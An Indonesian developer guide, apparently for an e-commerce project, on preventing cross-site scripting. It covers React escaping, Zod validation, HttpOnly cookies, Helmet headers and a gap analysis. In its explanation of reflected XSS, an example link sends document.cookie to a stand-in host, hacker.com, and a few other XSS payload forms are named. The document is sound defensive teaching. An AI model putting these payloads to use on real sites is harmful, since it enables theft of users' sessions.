# 08. Cross-Site Scripting (XSS) Prevention & Content Security

## 1. Masalah yang Terjadi (Vulnerability Anatomy & Real-World Risks)

**Cross-Site Scripting (XSS)** adalah kerentanan keamanan di mana penyerang berhasil menyuntikkan skrip JavaScript berbahaya ke dalam aplikasi web terpercaya. Skrip tersebut kemudian dieksekusi langsung di dalam browser milik korban yang sah.

```mermaid
flowchart TD
    Attacker["Penyerang (Attacker)"] -->|1. Submit Review Jahat:<br/>'<script>stealSession()</script>'| API["Nexa Backend API"]
    API -->|2. Simpan Komentar Mentah ke Database| DB[(PostgreSQL)]
    DB -->|3. Kirim Data Ulasan| VictimBrowser["Browser Korban / Pelanggan Lain"]
    VictimBrowser -->|4. Jika Frontend Render via innerHTML:<br/>Skrip Eksekusi di Laptop Korban!| Exploit["Pencurian Session / Keylogging / Phising Redirect"]

    style Attacker fill:#ffdddd,stroke:#d9534f
    style API fill:#fff0db,stroke:#f0ad4e
    style DB fill:#eceff1,stroke:#455a64
    style VictimBrowser fill:#fff0db,stroke:#f0ad4e
    style Exploit fill:#f2dede,stroke:#a94442
```

### Tiga Varian XSS & Dampaknya pada E-Commerce:

1. **Stored (Persistent) XSS:**
   * Penyerang memasukkan payload `<script>` atau `<img src=x onerror=...>` pada kolom ulasan produk (*review*), nama penerima alamat pengiriman, atau deskripsi produk.
   * *Dampak:* Setiap kali calon pembeli lain atau admin toko membuka halaman produk tersebut, skrip penyerang otomatis berjalan di browser mereka.
2. **Reflected XSS:**
   * Penyerang membagikan tautan jebakan: `https://nexa.com/search?q=<script>fetch('http://hacker.com/steal?data='+document.cookie)</script>`.
   * *Dampak:* Jika server memantulkan (*reflect*) kata kunci pencarian mentah-mentah ke halaman web tanpa escaping, skrip akan dieksekusi saat tautan dibuka oleh korban.
3. **DOM-based XSS:**
   * Terjadi ketika JavaScript di sisi klien mengambil input dari URL/hash dan langsung menuliskannya ke halaman menggunakan API berbahaya seperti `element.innerHTML = userInput` atau `eval()`.
   * *Dampak:* Penyerang dapat mencuri token sesi dari memori, merekam tombol keyboard (*keylogger*) saat mengetik data kartu pembayaran, atau memanipulasi tampilan (*defacement*).

---

## 2. Solusi Best Practice (OWASP XSS Defense)

Project **Nexa Streetwear** menerapkan 4 benteng penangkalan XSS (*Defense-in-Depth*):

1. **Context-Aware Automatic Output Escaping (React Virtual DOM):**
   * Di frontend React, ekspresi `{variable}` secara otomatis mengubah karakter berbahaya menjadi entitas HTML aman:
     * `<` diubah menjadi `&lt;`
     * `>` diubah menjadi `&gt;`
     * `&` diubah menjadi `&amp;`
     * `"` diubah menjadi `&quot;`
     * `'` diubah menjadi `&#x27;`
   * Browser memperlakukan teks tersebut murni sebagai tulisan visual, bukan perintah kode JavaScript yang bisa dijalankan.
2. **Zero `dangerouslySetInnerHTML` Policy:**
   * Seluruh antarmuka frontend dilarang keras menggunakan API `dangerouslySetInnerHTML` untuk merender data dari database atau input pengguna.
3. **Imunitas Pencurian Token via Cookie `HttpOnly`:**
   * Bahkan jika sebuah celah XSS berhasil dieksekusi di browser, penyerang **TIDAK BISA mencuri `refreshToken`** karena cookie tersebut berstatus `httpOnly: true`. Perintah JavaScript `document.cookie` tidak akan pernah bisa membaca nilainya.
4. **HTTP Security Headers via Helmet:**
   * Menyematkan `X-Content-Type-Options: nosniff` (mencegah browser mengeksekusi file non-script sebagai script) dan `X-Frame-Options: SAMEORIGIN` (mencegah serangan Clickjacking).
5. **Skema Validasi Input di Boundary:**
   * Validasi skema Zod di backend membatasi panjang karakter ulasan, alamat, dan nama produk, serta memangkas spasi liar (*trimming*).

---

## 3. Implementasi Nyata di Codebase Project

### A. Zero `dangerouslySetInnerHTML` pada Frontend React
Seluruh komponen React di [`frontend/src`](file:///home/allrole/Documents/Learning/Streetwear%20|%20E-commerce%20Project/frontend/src) merender data pengguna menggunakan JSX escaping standar:

```tsx
// frontend/src/modules/product/components/ProductReviews.tsx (Aman)
<p className="text-sm text-gray-700">{review.comment}</p>
```
*Jika `review.comment` berisi `<script>alert('hack')</script>`, React otomatis merendernya sebagai teks literal `&lt;script&gt;alert('hack')&lt;/script&gt;` sehingga tidak dieksekusi.*

---

### B. Validasi Input Ulasan Produk di [`backend/src/modules/review/review.validation.ts`](file:///home/allrole/Documents/Learning/Streetwear%20|%20E-commerce%20Project/backend/src/modules/review/review.validation.ts)

Setiap ulasan pembeli divalidasi oleh skema Zod sebelum disimpan ke database:

```typescript
// backend/src/modules/review/review.validation.ts
import { z } from "zod";

export const createReviewSchema = z.object({
  rating: z.coerce.number().int().min(1, "Rating minimal 1").max(5, "Rating maksimal 5"),
  comment: z.string().trim().max(500, "Komentar maksimal 500 karakter").optional(),
});
```

Dipasang pada route:
[`backend/src/modules/review/review.routes.ts`](file:///home/allrole/Documents/Learning/Streetwear%20|%20E-commerce%20Project/backend/src/modules/review/review.routes.ts#L8-L13)
```typescript
router.post(
  "/products/:productId/reviews",
  verifyAccessToken,
  validate(createReviewSchema),
  ReviewController.createReview
);
```

---

### C. Proteksi `HttpOnly` pada Session Cookie di [`backend/src/modules/auth/auth.controller.ts`](file:///home/allrole/Documents/Learning/Streetwear%20|%20E-commerce%20Project/backend/src/modules/auth/auth.controller.ts#L5-L10)

```typescript
// backend/src/modules/auth/auth.controller.ts
const cookiesOptions: CookieOptions = {
  httpOnly: true, // Kebal dari XSS document.cookie stealing
  secure: env.NODE_ENV === "production",
  sameSite: "strict",
  maxAge: 7 * 24 * 60 * 60 * 1000,
};
```

---

### D. Hardened Security Headers di [`backend/src/middleware/securityMiddleware.ts`](file:///home/allrole/Documents/Learning/Streetwear%20|%20E-commerce%20Project/backend/src/middleware/securityMiddleware.ts#L11-L19)

Helmet secara otomatis menyematkan header keamanan berikut pada setiap respons API:
* `X-Content-Type-Options: nosniff`: Melarang browser menebak-nebak tipe MIME file yang diunggah.
* `X-Frame-Options: SAMEORIGIN`: Melindungi halaman dari teknik *iFrame overlay / Clickjacking*.
* `X-Download-Options: noopen`: Mencegah Internet Explorer mengeksekusi unduhan dalam konteks situs.

---

## 4. Developer XSS Checklist

- [x] **Zero dangerouslySetInnerHTML:** Seluruh komponen React tidak menggunakan manipulasi DOM mentah.
- [x] **HttpOnly Cookie Tokens:** Refresh token terlindung di dalam cookie `httpOnly: true`.
- [x] **Strict Input Validation:** Seluruh input teks (nama, ulasan, alamat) dibatasi panjang karakternya menggunakan Zod.
- [x] **MIME Sniffing Blocked:** Header `X-Content-Type-Options: nosniff` aktif via Helmet.
- [x] **Safe Attribute Binding:** Tidak menyematkan URL dinamis yang tidak tervalidasi pada atribut `href` atau `src` (seperti `javascript:...` link injection).

---

## 5. Evaluasi & Gap Analysis Standar Industri (Batasan Mentok)

Sebagai Senior Backend Engineer, berikut adalah hasil evaluasi ketahanan sistem terhadap serangan XSS dan injeksi konten dibanding standar industri level enterprise:

### A. Komponen yang Sudah Teruji & Solid (Production-Ready)
1. **React JSX Auto-Escaping:** Seluruh data teks dinamis di frontend ter-render aman melalui virtual DOM tanpa manipulasi mentah `innerHTML`.
2. **HttpOnly Cookie Vaulting:** Token sesi `refreshToken` berada di luar jangkauan eksekusi JavaScript runtime (`document.cookie`), sehingga penyerang tidak dapat mencuri token sesi via XSS.
3. **MIME Sniffing Prevention:** Pengaktifan `X-Content-Type-Options: nosniff` mencegah eksekusi file teks atau gambar yang disamarkan sebagai JavaScript.

### B. Gap Analysis: Hal yang Belum Diterapkan Menuju "Batasan Mentok"

| Mekanisme Pertahanan XSS | Kondisi Saat Ini di Codebase | Standar Batasan Mentok (Enterprise Grade) | Dampak & Urgensi |
| :--- | :--- | :--- | :--- |
| **Strict Content Security Policy (CSP)** | Header CSP saat ini di-nonaktifkan (`contentSecurityPolicy: false` di Helmet Express). | Mengaktifkan CSP dengan Nonce kriptografis dinamis per request (`script-src 'self' 'nonce-...' https://app.midtrans.com; object-src 'none'; base-uri 'self'`). | **Tinggi (P1):** Tanpa header CSP, jika penyerang berhasil menemukan celah injeksi script sekecil apapun di frontend, browser korban akan mengeksekusi script tersebut dan bebas mengirim data ke server peretas (exfiltration). |
| **Server-Side HTML Sanitization (DOMPurify)** | Validasi hanya membatasi panjang teks string via Zod; belum ada sanitasi parsing HTML. | Jika modul katalog atau ulasan mengizinkan teks berformat (*rich text / WYSIWYG*), wajib disaring di backend menggunakan `isomorphic-dompurify` atau `sanitize-html`. | **Tinggi (P1):** Jika di masa depan admin ingin menulis deskripsi produk berformat tebal/miring, tanpa sanitizer server-side payload XSS tersimpan mentah di PostgreSQL. |
| **SVG Upload Sanitization / Disallow SVG** | Middleware upload gambar (`uploadProductImage`) belum memblokir berkas bertipe `image/svg+xml` secara eksplisit. | Menolak total file `.svg` untuk gambar produk/avatar atau memprosesnya lewat parser rasterizing (Sharp) menjadi WebP/PNG murni. | **Sedang (P2):** Berkas `.svg` sebenarnya adalah berkas XML yang sah berisi tag `<script>` atau event `onload="alert(1)"`. Jika dibuka langsung via URL browser, script di dalamnya langsung dieksekusi. |
| **W3C Trusted Types Enforcement** | Frontend belum menerapkan konfigurasi browser *Trusted Types API*. | Mengaktifkan `require-trusted-types-for 'script'` pada CSP header sehingga browser otomatis menolak pemanggilan sinkron API berbahaya yang tidak terdaftar. | **Rendah (P3):** Benteng keamanan generasi masa depan untuk mencegah library pihak ketiga menyuntikkan script liar. |

### C. Rekomendasi Roadmap Implementasi
1. **Prioritas Terdekat (Blokir SVG Malicious Upload):** Pastikan filter ekstensi dan MIME type di konfigurasi Multer [`backend/src/utils/cloudinary.ts`](file:///home/allrole/Documents/Learning/Streetwear%20|%20E-commerce%20Project/backend/src/utils/cloudinary.ts) dan middleware upload hanya mengizinkan `image/jpeg`, `image/png`, dan `image/webp`.
2. **Prioritas Menengah (CSP Header Rollout):** Aktifkan CSP bertahap menggunakan mode `Content-Security-Policy-Report-Only` terlebih dahulu untuk memantau script pihak ketiga (seperti Midtrans Snap JS SDK) sebelum menerapkan mode blokir ketat.
